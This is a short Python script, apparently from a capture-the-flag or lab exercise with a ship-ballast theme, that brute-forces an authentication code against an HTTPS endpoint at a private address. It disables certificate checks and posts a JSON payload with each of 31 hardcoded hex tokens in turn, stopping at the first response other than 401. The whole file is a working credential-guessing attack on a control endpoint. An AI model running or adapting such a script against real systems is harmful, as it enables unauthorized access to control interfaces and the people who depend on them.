import requests
import urllib3

# ignore insecure cert warning
urllib3.disable_warnings()

url = 'https://10.0.1.11:31968/ballast'
tokens = ["7c891300d29ee171", "d4e26453da9da0da", "c4bb7fbedcd289f9", "f2fa13a69c41edd3", "5a834caf9aa572f2", "265f6855da808fee", "af0a0ebbd8d06805", "1a3bdc9e354595b3", "0dcded01a3ef45b3", "396324979803a664", "87fd4e2c33578122", "ba418662d921ca86", "274d080f89b03da1", "6433c4059f5ac1d5", "4110cf37d60ac7a5", "b6af0a74f1787e3a", "162aebf2755e2f42", "6d2af8874200f1f7", "fe142ee05fbdf046", "c17a5d2a0857c687", "7b3ced5924e1beed", "7245a54b379f996a", "5180e6aaa397fb6a", "17d3cf64165ac676", "60d9051cbc7df99e", "c661182f67edb4a8", "4af257c2e1529722", "b5ea4144e885b1db", "7a92ebfcd8e93047", "a4f494fa78df7a39", "61e521c49e0d13a5"]

for token in tokens:
    payload = {
        'port': 0,
        'stbd': 0,
        'authCode': token,
    }
    
    r = requests.post(url, json=payload, verify=False)
    print(token + " " + str(r.status_code))

    if (r.status_code != 401):
        exit()

print('Failed to find valid token')
